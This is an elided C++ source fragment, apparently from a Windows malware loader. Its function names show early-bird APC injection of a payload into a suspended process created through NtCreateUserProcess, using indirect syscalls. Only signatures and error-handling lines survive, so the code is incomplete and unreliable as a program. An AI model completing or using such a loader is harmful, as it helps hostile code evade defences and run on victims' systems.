...
#include "../include/Tasking-Indirect-Syscalls.hpp"


static bool EarlyBird(void* RemotePayload, HANDLE hMainThread) {
...
static bool CreateSuspendedProcess(
	...
	if (status != ERROR_SUCCESS) {
		std::cout << "NtCreateUserProcess Status: 0x" << std::hex << status << std::endl;
	}
...
static std::array<std::wstring, 3> ConstructProcessArguments() {
	...
	if (pGetWindowsDirectoryW == nullptr) {
		std::cout << "{!!} Failed to retrieve GetWindowsDirectoryW function pointer." << std::endl;
		return ProcessArguments;
	}

	if (!pGetWindowsDirectoryW(Buffer, MAX_PATH * 2)) {
		std::cout << "{!!} Failed to get the Windows directory." << std::endl;
		return ProcessArguments;
	}
...
static void* WritePayload(HANDLE hProcess, void* Local, size_t PayloadSize) {
...
static bool GetPayloadPointer(void*& PayloadPtr, size_t& Size) {
...
int main() {
	...
	std::array<std::wstring, 3> ProcessArguments = ConstructProcessArguments();
	if (ProcessArguments[1].empty()) {
		return -1;
	}
